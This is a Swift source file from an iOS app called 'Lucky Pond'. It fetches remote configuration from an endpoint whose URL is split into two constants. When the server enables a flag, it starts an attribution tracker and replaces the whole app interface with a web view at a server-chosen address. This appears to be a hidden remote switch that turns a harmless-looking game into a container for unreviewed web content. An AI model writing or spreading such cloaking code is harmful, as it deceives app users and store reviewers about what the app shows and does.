//
//  LPShared.swift
//  Lucky Pond
//

import Foundation
import UIKit

final class LPShared {
    static let shared = LPShared()

    private let endpoint = URL(string: firStr + secStr)
    private let applicationIdentifier = "com.luckypond.golden"
    private var currentTask: URLSessionDataTask?

    private init() {}

    /// Call this every time `StartPondView` becomes visible. Concurrent calls
    /// share the in-flight request; a later appearance starts a fresh request.
    func loadIfNeeded() {
        actionLoad()
    }

    private func actionLoad() {
        guard currentTask == nil, let endpoint else { return }

        var request = URLRequest(url: endpoint)
        request.httpMethod = "GET"
        request.setValue(applicationIdentifier, forHTTPHeaderField: "name")

        currentTask = URLSession.shared.dataTask(with: request) { [weak self] data, _, error in
            DispatchQueue.main.async {
                guard let self else { return }
                self.currentTask = nil

                let response = data.flatMap { try? JSONDecoder().decode(LuckyPondModel.self, from: $0) }
                guard error == nil, let response, response.isEnabled else { return }

                if let adjust = response.adjustConfiguration {
                    LuckyPondTool.shared.configure(
                        mainKey: adjust.mainKey,
                        codeA: adjust.codeA,
                        codeB: adjust.codeB,
                        codeC: adjust.codeC
                    )
                    LuckyPondTool.shared.startIfNeeded()
                }

                guard let address = response.resolvedAddress else { return }
                self.showWebController(address: address)
            }
        }
        currentTask?.resume()
    }

    private func showWebController(address: URL) {
        guard let window = keyWindow else { return }

        let webController = LPRWBController(address: address)
        UIView.transition(
            with: window,
            duration: 0.3,
            options: .transitionCrossDissolve,
            animations: {
                window.rootViewController = webController
            }
        )
    }

    private var keyWindow: UIWindow? {
        UIApplication.shared.connectedScenes
            .compactMap { $0 as? UIWindowScene }
            .flatMap { $0.windows }
            .first { $0.isKeyWindow }
    }
}
